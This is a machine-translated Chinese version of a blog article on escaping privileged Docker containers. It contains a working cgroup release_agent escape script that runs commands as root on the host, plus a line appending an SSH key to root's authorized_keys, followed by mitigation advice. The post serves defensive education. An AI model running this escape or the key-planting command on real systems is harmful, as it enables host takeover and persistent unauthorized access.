<html>
<head>
<title>Escaping Docker Privileged Containers</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">逃脱码头特许集装箱</h1>
<blockquote>原文：<a href="https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1?source=collection_archive---------0-----------------------#2020-07-02">https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1?source=collection_archive---------0-----------------------#2020-07-02</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="aee6" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">为什么不应该使用“特权”标志运行Docker</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/dce50ab9548a1829fc5c921c9f344510.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*LA9V7v2rzWepKLJB"/></div></div><p class="ku kv gj gh gi kw kx bd b be z dk translated"><a class="ae ky" href="https://unsplash.com/@freestocks?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> freestocks </a>在<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</p></figure><p id="4c73" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">特权停靠容器是使用<code class="fe lv lw lx ly b">--privileged</code>标志运行的容器。与常规容器不同，这些容器对主机具有root权限。</p><p id="01db" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">当容器需要直接访问硬件来完成它们的任务时，通常使用特权容器。但是，特权Docker容器可让攻击者接管主机系统。今天，我们来看看攻击者是如何逃脱特权容器的。</p></div><div class="ab cl lz ma hx mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="im in io ip iq"><h1 id="63c2" class="mg mh it bd mi mj mk ml mm mn mo mp mq jz mr ka ms kc mt kd mu kf mv kg mw mx bi translated">寻找可利用的容器</h1><p id="b7e0" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">但是，我们首先如何判断我们是否在特权容器中呢？</p><h2 id="8eb6" class="nd mh it bd mi ne nf dn mm ng nh dp mq li ni nj ms lm nk nl mu lq nm nn mw no bi translated">你怎么知道你是否在一个容器里？</h2><p id="82b1" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">cgroups代表“控制组”它是Linux的一个特性，可以隔离资源的使用，Docker就是用它来隔离容器的。您可以通过在<code class="fe lv lw lx ly b">/proc/1/cgroup</code>检查init进程的控制组来判断您是否在一个容器中。如果你不在集装箱内，控制组应该是<code class="fe lv lw lx ly b">/</code>。另一方面，如果你在一个容器中，你应该看到<code class="fe lv lw lx ly b">/docker/CONTAINER_ID</code>。</p><h2 id="e81f" class="nd mh it bd mi ne nf dn mm ng nh dp mq li ni nj ms lm nk nl mu lq nm nn mw no bi translated">如何判断一个容器是否有特权？</h2><p id="c66d" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">一旦你确定你在一个容器中，你需要确定这个容器是否有特权。最好的方法是运行一个需要<code class="fe lv lw lx ly b">--privileged</code>标志的命令，看看它是否成功。</p><p id="e367" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">例如，您可以尝试使用<code class="fe lv lw lx ly b">iproute2</code>命令添加一个虚拟接口。这个命令需要<code class="fe lv lw lx ly b">NET_ADMIN</code>功能，如果容器有特权，它就会有这个功能:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="595d" class="nd mh it ly b gy nt nu l nv nw">$ <!-- -->ip link add dummy0 type dummy</span></pre><p id="40e2" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">如果这个命令成功运行，您可以断定容器具有<code class="fe lv lw lx ly b">NET_ADMIN</code>功能。<code class="fe lv lw lx ly b">NET_ADMIN</code>是特权能力集的一部分，没有它的容器是没有特权的。通过运行以下命令，您可以在测试后清理<code class="fe lv lw lx ly b">dummy0</code>链接:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="cc38" class="nd mh it ly b gy nt nu l nv nw">ip link delete dummy0</span></pre></div><div class="ab cl lz ma hx mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="im in io ip iq"><h1 id="b2cc" class="mg mh it bd mi mj mk ml mm mn mo mp mq jz mr ka ms kc mt kd mu kf mv kg mw mx bi translated">集装箱逃逸</h1><p id="c40a" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">那么如何逃离特权容器呢？通过使用这个脚本。这个例子和PoC取自Bits博客的<a class="ae ky" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" rel="noopener ugc nofollow" target="_blank">线索。阅读原始帖子，了解PoC的更详细解释:</a></p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="afe4" class="nd mh it ly b gy nt nu l nv nw">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><span id="76d1" class="nd mh it ly b gy nx nu l nv nw">echo 1 &gt; /tmp/cgrp/x/notify_on_release<br/>host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`<br/>echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</span><span id="9b4e" class="nd mh it ly b gy nx nu l nv nw">echo '#!/bin/sh' &gt; /cmd<br/>echo "ps aux &gt; $host_path/output" &gt;&gt; /cmd<br/>chmod a+x /cmd</span><span id="90a9" class="nd mh it ly b gy nx nu l nv nw">sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span></pre><p id="2eb6" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">这个PoC通过利用cgroup的<code class="fe lv lw lx ly b">release_agent</code>功能来工作。</p><p id="e2c0" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">cgroup中的最后一个进程退出后，将运行一个用于删除被放弃的cgroups的命令。该命令在<code class="fe lv lw lx ly b">release_agent</code>文件中指定，并在主机上作为root运行。默认情况下，此功能被禁用，并且<code class="fe lv lw lx ly b">release_agent</code>路径为空。</p><p id="640d" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">这个漏洞通过<code class="fe lv lw lx ly b">release_agent</code>文件运行代码。我们需要创建一个cgroup，指定它的<code class="fe lv lw lx ly b">release_agent</code>文件，并通过杀死cgroup中的所有进程来触发<code class="fe lv lw lx ly b">release_agent</code>。PoC中的第一行创建了一个新组:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="61db" class="nd mh it ly b gy nt nu l nv nw">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span></pre><p id="94be" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">下一行启用<code class="fe lv lw lx ly b">release_agent</code>功能:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="f8ec" class="nd mh it ly b gy nt nu l nv nw">echo 1 &gt; /tmp/cgrp/x/notify_on_release</span></pre><p id="0445" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">然后，接下来的几行将命令文件的路径写到<code class="fe lv lw lx ly b">release_agent</code>文件:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="4529" class="nd mh it ly b gy nt nu l nv nw">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`<br/>echo "$host_path/cmd" &gt; /tmp/cgrp/release_agent</span></pre><p id="6c29" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">然后，我们可以开始写入我们的命令文件。该脚本将执行<code class="fe lv lw lx ly b">ps aux</code>命令，并将其保存到<code class="fe lv lw lx ly b">/output</code>文件中。我们还需要设置脚本的执行权限位:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="8e70" class="nd mh it ly b gy nt nu l nv nw">echo '#!/bin/sh' &gt; /cmd<br/>echo "ps aux &gt; $host_path/output" &gt;&gt; /cmd<br/>chmod a+x /cmd</span></pre><p id="d158" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">最后，通过在我们创建的cgroup中生成一个立即结束的进程来触发攻击。我们的<code class="fe lv lw lx ly b">release_agent</code>脚本将在流程结束后执行。您现在可以在主机上的<code class="fe lv lw lx ly b">/output</code>文件中读取<code class="fe lv lw lx ly b">ps aux</code>的输出:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="bab1" class="nd mh it ly b gy nt nu l nv nw">sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span></pre><p id="d45c" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">您可以使用PoC在主机系统上执行任意命令。例如，您可以使用它将您的SSH密钥写入root用户的<code class="fe lv lw lx ly b">authorized_keys</code>文件:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="98d2" class="nd mh it ly b gy nt nu l nv nw">cat id_dsa.pub &gt;&gt; <!-- -->/root/<!-- -->.ssh/authorized_keys</span></pre></div><div class="ab cl lz ma hx mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="im in io ip iq"><h1 id="b56b" class="mg mh it bd mi mj mk ml mm mn mo mp mq jz mr ka ms kc mt kd mu kf mv kg mw mx bi translated">减轻</h1><p id="c2b9" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">您如何防止这种攻击发生？您不应该授予容器对主机系统的完全访问权限，而应该赋予容器它们所需要的独立“能力”。</p><p id="0547" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">Docker功能为开发人员提供了对容器权限的细粒度控制。功能将通常打包为“根访问”的权限分解为单独的权限。</p><p id="271e" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">默认情况下，Docker删除容器的所有功能，并要求添加功能。您可以使用<code class="fe lv lw lx ly b">cap-drop</code>和<code class="fe lv lw lx ly b">cap-add</code>标志删除或添加功能。</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="e24f" class="nd mh it ly b gy nt nu l nv nw">--cap-drop=all<br/>--cap-add=LIST_OF_CAPABILITIES</span></pre><p id="671c" class="pw-post-body-paragraph kz la it lb b lc ld ju le lf lg jx lh li lj lk ll lm ln lo lp lq lr ls lt lu im bi translated">例如，如果需要绑定到低于1024的端口，您可以授予它<code class="fe lv lw lx ly b">NET_BIND_SERVICE</code>功能，而不是授予容器root访问权限。此标志将授予容器以下能力:</p><pre class="kj kk kl km gt np ly nq nr aw ns bi"><span id="a4c4" class="nd mh it ly b gy nt nu l nv nw">--cap-add NET_BIND_SERVICE</span></pre></div><div class="ab cl lz ma hx mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="im in io ip iq"><h1 id="457b" class="mg mh it bd mi mj mk ml mm mn mo mp mq jz mr ka ms kc mt kd mu kf mv kg mw mx bi translated">结论</h1><p id="c2c2" class="pw-post-body-paragraph kz la it lb b lc my ju le lf mz jx lh li na lk ll lm nb lo lp lq nc ls lt lu im bi translated">如果可能，避免运行带有<code class="fe lv lw lx ly b">--privileged</code>标志的Docker容器。特权容器可能允许攻击者突破容器并获得对主机系统的控制。改为用<code class="fe lv lw lx ly b">--cap-add</code>标志授予容器单独的能力。</p></div><div class="ab cl lz ma hx mb" role="separator"><span class="mc bw bk md me mf"/><span class="mc bw bk md me mf"/><span class="mc bw bk md me"/></div><div class="im in io ip iq"><h1 id="737f" class="mg mh it bd mi mj mk ml mm mn mo mp mq jz mr ka ms kc mt kd mu kf mv kg mw mx bi translated">进一步阅读</h1><ul class=""><li id="b20a" class="ny nz it lb b lc my lf mz li oa lm ob lq oc lu od oe of og bi translated"><a class="ae ky" href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="noopener ugc nofollow" target="_blank">Linux内核功能列表</a></li><li id="e412" class="ny nz it lb b lc oh lf oi li oj lm ok lq ol lu od oe of og bi translated"><a class="ae ky" href="https://docs.docker.com/engine/security/security/#linux-kernel-capabilities" rel="noopener ugc nofollow" target="_blank">安全使用Docker</a></li><li id="a338" class="ny nz it lb b lc oh lf oi li oj lm ok lq ol lu od oe of og bi translated"><a class="ae ky" href="https://blog.trendmicro.com/trendlabs-security-intelligence/why-running-a-privileged-container-in-docker-is-a-bad-idea/" rel="noopener ugc nofollow" target="_blank">特许集装箱安全最佳实践</a></li></ul></div></div>    
</body>
</html>